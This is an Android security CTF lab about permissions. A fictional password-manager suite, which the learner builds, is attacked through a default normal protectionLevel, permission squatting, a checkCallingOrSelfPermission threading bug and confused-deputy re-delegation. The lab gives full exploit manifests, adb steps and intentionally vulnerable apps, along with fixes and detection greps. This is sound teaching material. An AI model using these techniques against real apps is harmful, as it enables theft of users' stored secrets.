# Lab 04 — CTF: The Borrowed Key

> **Level:** Advanced
> **Time:** 3–4 hours
> **Needs:** a device or emulator you own, `adb`, the Android SDK build-tools, a JDK, Python 3.6+
> **Chapter:** [23-Permissions](../README.md) — the whole of §3
> **Format:** five flags, each one a different mechanism, chained. Solve them in order.

---

## The scenario

`Ardent Vault` is a password manager that ships as a suite of three apps.

```
com.ardent.vault        the vault. Holds the secrets. Exports one service.
com.ardent.sync         optional cloud sync. DECLARES the suite's permission.
com.ardent.helper       a small "accessibility helper" the vendor bundles.
```

Your target device has the vault and the helper installed. **The sync app is not installed**,
because the user declined cloud sync at setup.

You have an unprivileged app on the device and nothing else. No root, no `pm grant`, no
`adb shell` in your final write-up — the shell is available to you for reconnaissance, but no flag
counts unless you can also reach it from an app.

Five flags. Each is a string of the form `ARDENT{...}`.

| Flag | Worth | The mechanism |
|---|---|---|
| 1 | warm-up | Reading grant state correctly |
| 2 | easy | Resolving a protection level and an owner |
| 3 | **the core** | Permission squatting against a used-but-undeclared name |
| 4 | medium | The `checkCallingOrSelfPermission` threading bug |
| 5 | hard | Re-delegation: making the helper act with a capability you can never hold |

---

## Rules

1. **Build everything from source.** The challenge apps are manifests and Java in
   `ctf-the-borrowed-key/` (created by you, in Part 0 — see Setup). Nothing is shipped as an APK.
2. **`adb shell` is reconnaissance only.** It runs as UID 2000 and holds permissions assigned by
   `platform.xml` that no app can request. A flag claimed from the shell alone does not count. Every
   flag must be obtainable by an app with an ordinary UID.
3. **No `pm grant`.** Two of the five flags become trivial and meaningless if you grant yourself
   things from the shell. If you use it to debug, note it, and re-verify without it.
4. **No root, no Frida for the flags themselves.** Frida is allowed for *understanding* — hooking to
   read what the code does is fine and encouraged — but the exploit path must work without it.
5. **Uninstall everything when you finish.** Cleanup commands are in Part 6.

---

## Setup

### Part 0 — Build the challenge

The challenge apps are built from the chapter's own example scaffolding. You will construct them,
because constructing them is half the lesson: a challenge whose manifests you wrote yourself is one
whose mechanism you cannot help but understand.

```bash
# host
export ANDROID_SDK_ROOT="$HOME/Android/Sdk"
mkdir -p ~/ctf-borrowed-key && cd ~/ctf-borrowed-key
```

Create the three challenge apps by adapting the four manifests in
[`../examples/squat-pair/`](../examples/squat-pair/) and the activity in
[`../examples/probe-app/`](../examples/probe-app/). The build scripts in both directories work
unchanged on new manifests; copy one and point it at yours.

**`com.ardent.vault`** — the vault.

```xml
<!-- vault: USES a permission it does not DECLARE. The sync app declares it. -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.ardent.vault">
    <uses-sdk android:minSdkVersion="23" android:targetSdkVersion="33" />
    <application android:label="Ardent Vault">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <provider
            android:name=".VaultProvider"
            android:authorities="com.ardent.vault.provider"
            android:exported="true"
            android:readPermission="com.ardent.suite.permission.READ_VAULT"
            android:writePermission="com.ardent.suite.permission.READ_VAULT" />
        <service
            android:name=".VaultService"
            android:exported="true"
            android:permission="com.ardent.vault.permission.INTERNAL" />
    </application>
    <!-- Note: com.ardent.vault.permission.INTERNAL IS declared, at a level you should check. -->
    <permission android:name="com.ardent.vault.permission.INTERNAL" />
</manifest>
```

**`com.ardent.helper`** — the deputy. Give it a real `Service` whose `onBind` and whose Binder
methods both use `checkCallingOrSelfPermission`, and have one of them post the work to a `Handler`.

**`com.ardent.probe`** — yours. Copy
[`../examples/probe-app/`](../examples/probe-app/) wholesale and edit `<queries>`.

Provider and service implementations: keep them small. A `MatrixCursor` with three rows, one of
which is a flag, is enough. The point of this CTF is the permission model, not the SQLite.

> **If you would rather not author the challenge**
> Every flag below can be earned against the shipped examples instead:
> [`../examples/squat-pair/`](../examples/squat-pair/) covers flags 1–3 exactly, and
> [`../examples/weak-permissions-AndroidManifest.xml`](../examples/weak-permissions-AndroidManifest.xml)
> covers the reasoning for 4 and 5. The flag strings will be missing; the mechanism will not be.
> Doing it that way is a legitimate route and takes about half the time.

### Install order matters

```bash
# host — this is the state the CTF assumes
adb install -r out/vault.apk
adb install -r out/helper.apk
# com.ardent.sync is NOT installed. That is the whole point.
adb install -r out/probe.apk
```

---

## Flag 1 — What does the vault actually hold?

> **Difficulty:** warm-up. Ten minutes.

The vault's manifest requests a long list of permissions. One of them is not granted, and the flag
is hidden behind knowing which.

### The task

Capture the vault's grant state and produce the four sets. The flag is the name of the **only**
permission that appears in a grant block with `granted=false` — that is, the platform reached a
decision and the decision was no. Format it as `ARDENT{<permission name>}`.

```bash
# host
adb shell dumpsys package com.ardent.vault > vault.txt
python3 -B ~/Android-Security-Handbook/23-Permissions/scripts/grant-state.py vault.txt
```

### The trap

There will be several permissions in the `requested permissions:` block that are not in any grant
block at all. Those are **not** the answer. They were asked for and never resolved — usually
because the declaring app is not installed.

The answer is the permission that appears in `install permissions:` **with** `granted=false`. That
is a decision, not an absence.

<details>
<summary>Hint 1</summary>

`grant-state.py` prints the UNACCOUNTED set separately from the install block. Look at the install
block only.

</details>

<details>
<summary>Hint 2</summary>

By hand:

```bash
grep 'granted=false' vault.txt
```

</details>

<details>
<summary>What this flag is teaching</summary>

The difference between "asked for and never resolved" and "asked for and refused". They look
identical in a careless reading and they mean different things: the first usually means a
dependency is missing, the second means the platform evaluated the rule and the app did not
qualify.

A report that says "the app holds X" when X is in either category is wrong, and a report that
cannot tell the two apart cannot explain *why* the app does not hold it.

</details>

---

## Flag 2 — Which of the vault's own permissions is a lie?

> **Difficulty:** easy. Twenty minutes.

The vault declares `com.ardent.vault.permission.INTERNAL` and uses it to guard `VaultService`.

### The task

Resolve that permission's real protection level **from the device**, then reason about what it
protects. The flag is printed by `VaultService` when it is bound by an app that holds the
permission — which, once you have resolved the level, you will realise is any app at all.

```bash
# host — resolve the level and the owner
adb shell dumpsys package permission com.ardent.vault.permission.INTERNAL
adb shell pm list permissions -f -g | grep -A5 'ardent.vault.permission.INTERNAL'
```

Then add one line to your probe's manifest, rebuild, reinstall, and bind the service:

```bash
adb shell am start -n com.ardent.probe/.ProbeActivity \
    --es probe service --es target 'com.ardent.vault/.VaultService'
adb logcat -d -s PROBE:V
```

<details>
<summary>Hint 1</summary>

Look at the `<permission>` element in the vault's manifest again. What attribute is missing?

</details>

<details>
<summary>Hint 2</summary>

An omitted `android:protectionLevel` is not "undefined" and it is not "most restrictive". Confirm
on the device with `prot=` in the `dumpsys package permission` output.

</details>

<details>
<summary>Hint 3 — the one line</summary>

```xml
<uses-permission android:name="com.ardent.vault.permission.INTERNAL" />
```

Rebuild the probe. Do not forget `<queries>` for `com.ardent.vault`, or the bind will fail in a way
that looks like a permission denial.

</details>

<details>
<summary>What this flag is teaching</summary>

That the default `protectionLevel` is `normal`, that `normal` means "granted to any app that asks,
silently, at install", and therefore that a permission declared without a level is access control
that grants itself.

It is also teaching the one-grep check that finds this in any manifest, with zero false positives:

```bash
grep -n '<permission ' AndroidManifest.xml | grep -v protectionLevel
```

</details>

---

## Flag 3 — The borrowed key

> **Difficulty:** the core of the CTF. Sixty to ninety minutes.
> **This is the flag the challenge is named after.**

`VaultProvider` is exported and guarded, read and write, by
`com.ardent.suite.permission.READ_VAULT`.

That is a permission the vault **uses** and does not **declare**. `com.ardent.sync` declares it, at
`signature` — and `com.ardent.sync` is not installed.

### The task

Read the vault's provider. The flag is a row in it.

### Before you start

Establish the state of the permission on the device. All three of these should agree that nobody
owns it:

```bash
# host
adb shell pm list permissions -f -g | grep -A4 'ardent.suite.permission.READ_VAULT'
adb shell dumpsys package permission com.ardent.suite.permission.READ_VAULT

cd ~/Android-Security-Handbook/23-Permissions
python3 -B scripts/permission-audit.py \
        --manifest ~/ctf-borrowed-key/vault/AndroidManifest.xml
#   verdicts : UNOWNED 1
```

Then confirm that the provider is, right now, genuinely unreachable:

```bash
adb shell am start -n com.ardent.probe/.ProbeActivity \
    --es probe query --es target 'content://com.ardent.vault.provider/entries'
adb logcat -d -s PROBE:V
#   RESULT: query threw java.lang.SecurityException
#     message: Permission Denial: ... requires com.ardent.suite.permission.READ_VAULT
```

A permission nobody defines cannot be granted, so nobody can pass the gate. Good. Now change that.

<details>
<summary>Hint 1</summary>

The permission has no owner. What does the platform do with a permission name that no installed
package has claimed?

</details>

<details>
<summary>Hint 2</summary>

Ownership goes to whichever package **declares** the name first. Nothing reserves a namespace —
`com.ardent.suite.*` looks like it belongs to Ardent because of a convention, and a convention is
not a check.

</details>

<details>
<summary>Hint 3</summary>

You need two lines in your probe's manifest, not one. Declare the permission, and request it.

```xml
<permission
    android:name="com.ardent.suite.permission.READ_VAULT"
    android:protectionLevel="normal"
    android:label="Read vault"
    android:description="@string/perm_desc" />
<uses-permission android:name="com.ardent.suite.permission.READ_VAULT" />
```

`android:description` must be a **string resource**, not a literal, or `aapt2` will refuse to link.

</details>

<details>
<summary>Hint 4 — it did not work</summary>

Check, in this order:

1. **Is the probe already installed from a previous run?** Uninstall and reinstall — the
   declaration is evaluated at install time.
2. **Did `com.ardent.sync` get installed by accident?** If it did, your install will have failed
   with `INSTALL_FAILED_DUPLICATE_PERMISSION` and the whole flag is blocked. Uninstall it.
3. **Who owns it now?**
   ```bash
   adb shell dumpsys package permission com.ardent.suite.permission.READ_VAULT
   ```
   You want `sourcePackage=com.ardent.probe` and `prot=normal`.
4. **Did the grant land?**
   ```bash
   adb shell dumpsys package com.ardent.probe | grep -A3 'install permissions:'
   ```
   You want `granted=true`.
5. **`<queries>`.** Always `<queries>`.

</details>

<details>
<summary>Full solution</summary>

Add to the probe's manifest:

```xml
<permission
    android:name="com.ardent.suite.permission.READ_VAULT"
    android:protectionLevel="normal"
    android:label="Read vault"
    android:description="@string/perm_desc" />
<uses-permission android:name="com.ardent.suite.permission.READ_VAULT" />
<queries>
    <package android:name="com.ardent.vault" />
    <provider android:authorities="com.ardent.vault.provider" />
</queries>
```

Add `perm_desc` to `res/values/strings.xml`. Rebuild, uninstall the old probe, install the new one.

```bash
adb uninstall com.ardent.probe
adb install -r out/probe.apk

adb shell dumpsys package permission com.ardent.suite.permission.READ_VAULT
#   sourcePackage=com.ardent.probe
#   uid=... gids=[] type=0 prot=normal

adb shell dumpsys package com.ardent.probe | grep READ_VAULT
#   com.ardent.suite.permission.READ_VAULT: granted=true

adb logcat -c
adb shell am start -n com.ardent.probe/.ProbeActivity \
    --es probe query --es target 'content://com.ardent.vault.provider/entries'
adb logcat -d -s PROBE:V
#   RESULT: query returned N rows
```

You did not obtain the vault's permission. You **became the authority that defines it**, and then
granted it to yourself.

</details>

<details>
<summary>What this flag is teaching</summary>

Everything in §3.6, and one thing beyond it.

The mechanism: a permission name has exactly one owning package, ownership goes to whoever installs
first, and a permission an app *uses* but does not *declare* is unowned on any device where the
declaring sibling is absent.

The thing beyond: **the vendor did everything they were told to do.** They namespaced the
permission. They set `signature` on it. They put it on both the read and write gates. Every one of
those is good advice and none of it helped, because the app that declared it was optional and the
user declined it.

The correct fix is the one nobody writes in a checklist: **every app in a suite declares the
permission identically, at `signature`**, so that no install order leaves the name unowned — plus
an in-code caller check with `PackageManager.checkSignatures`, which cannot be squatted at all.
See [`../examples/SignatureGuardedService.java`](../examples/SignatureGuardedService.java).

</details>

---

## Flag 4 — The helper's polite question

> **Difficulty:** medium. Forty-five minutes.

`com.ardent.helper` exposes a service. Its `onBind` calls `checkCallingOrSelfPermission` for a
permission you do not hold, and refuses you.

One of its Binder methods does the same check — but posts the actual work to a `Handler` first.

### The task

Reach the flag that the posted work produces.

<details>
<summary>Hint 1</summary>

Decompile the helper and read both check sites. `jadx -d jadx-helper/ helper.apk`, then:

```bash
grep -rn 'checkCallingOrSelfPermission\|Handler\|post(' jadx-helper/
```

</details>

<details>
<summary>Hint 2</summary>

`checkCallingOrSelfPermission` evaluates `Binder.getCallingUid()`. Inside a live Binder transaction
that is *your* UID. What is it when the code runs on a `Handler` thread, after the transaction has
returned?

</details>

<details>
<summary>Hint 3</summary>

Watch it live:

```bash
frida -U -n com.ardent.helper \
      -l ~/Android-Security-Handbook/23-Permissions/scripts/hook-permission-checks.js
```

The script prints `callingUid=… myUid=…  <-- NO BINDER TRANSACTION IN PROGRESS` whenever the two
match. That line appearing on the posted check, and not on the `onBind` check, is the answer.

Remember rule 4: Frida is for understanding. The exploit path must work without it.

</details>

<details>
<summary>Full solution</summary>

`onBind` runs synchronously on the incoming Binder thread, so `Binder.getCallingUid()` is your UID
and the check correctly denies you. The Binder method's *posted* work runs later, on the helper's
own `Handler` thread, with no transaction in progress — so `Binder.getCallingUid()` returns the
helper's own UID, and `checkCallingOrSelfPermission` returns `PERMISSION_GRANTED` because the
helper does hold the permission.

The exploit is therefore: reach the Binder method by whatever route `onBind` does not gate. In the
challenge that is a second, unguarded entry point — an exported receiver, or a `call()` on a
provider — that funnels into the same handler.

The fix is `checkCallingPermission`, which explicitly tests `pid != Process.myPid()` and returns
`PERMISSION_DENIED` when there is no caller. Or: capture the caller's UID **on the Binder thread**,
into a local, and pass it to the posted work.

</details>

<details>
<summary>What this flag is teaching</summary>

That the `OrSelf` family is a vulnerability pattern, not a convenience. The method name is longer
and reads as more thorough, which is exactly backwards: it adds a fallback that authorises the
current process whenever there is no caller, and a privileged app is always authorised against
itself.

It is one grep in any codebase:

```bash
grep -rn 'checkCallingOrSelfPermission\|enforceCallingOrSelfPermission' jadx-out/
```

and then one question about each hit: **what thread does this run on?**

</details>

---

## Flag 5 — Making the helper do it for you

> **Difficulty:** hard. Sixty to ninety minutes.

The final flag is not readable by any app. It is produced by an operation requiring a permission
that no installable app can hold.

`com.ardent.helper` holds that permission and exposes a component that performs the operation on
request.

### The task

Establish which permission you cannot hold, prove you cannot hold it, then get the helper to
exercise it for you and return the result.

### The permission arithmetic — do all four steps

1. **Name the operation** the helper performs on request.
2. **Attempt it directly from the probe.** It must fail with a `SecurityException` naming the
   permission. This is the negative control and without it the finding is unproven.
3. **Resolve the permission's level** with `pm list permissions -f -g`. It must be
   signature-anchored, or there is no escalation — you could have requested it.
4. **Confirm the helper holds it**, in a *grant* block of `dumpsys package com.ardent.helper`, not
   in the requested block.

<details>
<summary>Hint 1</summary>

```bash
adb shell dumpsys package com.ardent.helper > helper.txt
python3 -B ~/Android-Security-Handbook/23-Permissions/scripts/grant-state.py helper.txt
```

Look at what it *holds* and ask which of those you could not obtain yourself.

</details>

<details>
<summary>Hint 2</summary>

Then look at what it exposes:

```bash
python3 -B ~/Android-Security-Handbook/21-App-Sandbox/scripts/manifest-exposure.py \
        out-helper/AndroidManifest.xml --verdict WIDENED
```

</details>

<details>
<summary>Hint 3</summary>

The component takes attacker-controlled input and acts on it with the helper's own identity. Your
UID never appears past the first hop. From `system_server`'s point of view, the helper made the
request, and the helper is entitled to.

</details>

<details>
<summary>What this flag is teaching</summary>

Permission re-delegation, and specifically the discipline that separates a real finding from a
noisy one. The question is never "is there an exported component". It is **which permission did the
deputy hold that I could not have obtained?**

If the answer is "none — it holds only `normal` permissions I could have requested", the
re-delegation is real and the impact is zero, and saying so is what makes the rest of your report
believable.

If the answer names a `signature|privileged` permission and you have the negative control from step
2, you have the strongest class of finding this chapter covers. See
[`../README.md`](../README.md) §3.9 and [lab-03](lab-03-confused-deputy.md).

</details>

---

## Part 6 — Clean up

```bash
# host
adb uninstall com.ardent.probe
adb uninstall com.ardent.vault
adb uninstall com.ardent.helper
adb uninstall com.ardent.sync 2>/dev/null

# host — the squatted permission must be gone with its definer
adb shell pm list permissions -f -g | grep -i ardent
# (no output)

# host — no build artefacts left in the repository
cd ~/Android-Security-Handbook/23-Permissions
rm -rf examples/squat-pair/out examples/probe-app/out
```

That last check is not tidiness. Uninstalling the definer of a permission destroys the definition
and **every grant of it** — which is worth watching happen, because it is the answer to a question
users ask constantly and nobody explains: *why did the permission disappear after a reinstall?*

---

## Scoring

| Flag | Points | You have it when |
|---|---|---|
| 1 | 10 | You can name the refused permission and explain why the unaccounted set is not the answer |
| 2 | 15 | You bound the service from an app, having resolved the level from the device first |
| 3 | **35** | Your probe owns the permission name, holds it at `granted=true`, and read the provider |
| 4 | 20 | You reached the posted work and can explain the threading in one sentence |
| 5 | 20 | You have all four steps of the permission arithmetic, including the negative control |

**Passing is flag 3.** Everything else is technique around it; flag 3 is the mechanism this chapter
exists to teach, and it is the one that changes how you read every manifest afterwards.

---

## Debrief

Write, in your own words, answers to these. If any of them is hard, the corresponding section of
[`../README.md`](../README.md) is the one to reread.

1. Why is `normal` the default `protectionLevel`, and what would break if it were `signature`?
2. The vault's developer namespaced the permission and set `signature` on it. Why did flag 3 work
   anyway, and what should they have done instead?
3. On this device, what happens if two installed apps declare the same permission name? Why does
   that make the both-declare case a *different* finding from the used-but-undeclared case?
4. Why does `checkCallingPermission` fail closed where `checkCallingOrSelfPermission` fails open?
   Quote the difference in one sentence.
5. In flag 5, name the permission you borrowed and state, in one sentence, why you could never have
   obtained it directly.
6. For each of the five flags, say whether `adb shell` alone would have "worked" — and if it would,
   explain why that would not have been a finding.

---

## Related

- [`../README.md`](../README.md) — §3 in full; §3.6 for flag 3, §3.8 for flag 4, §3.9 for flag 5
- [`../cheatsheet.md`](../cheatsheet.md) — the command set and the "is this a finding?" table
- [`../faq.md`](../faq.md) — several of these questions, answered plainly
- [`../examples/squat-pair/`](../examples/squat-pair/) — the working squat, if you would rather not author the challenge
- [`../examples/probe-app/`](../examples/probe-app/) — the probe, which every flag needs
- [`../examples/SignatureGuardedService.java`](../examples/SignatureGuardedService.java) — the remediation for flags 2, 3 and 5
- [lab-02](lab-02-squatting.md) — the measured version of flag 3
- [lab-03](lab-03-confused-deputy.md) — the methodical version of flag 5
- [27-ContentProviders](../../27-ContentProviders/README.md) — what to do to a provider once the permission is yours
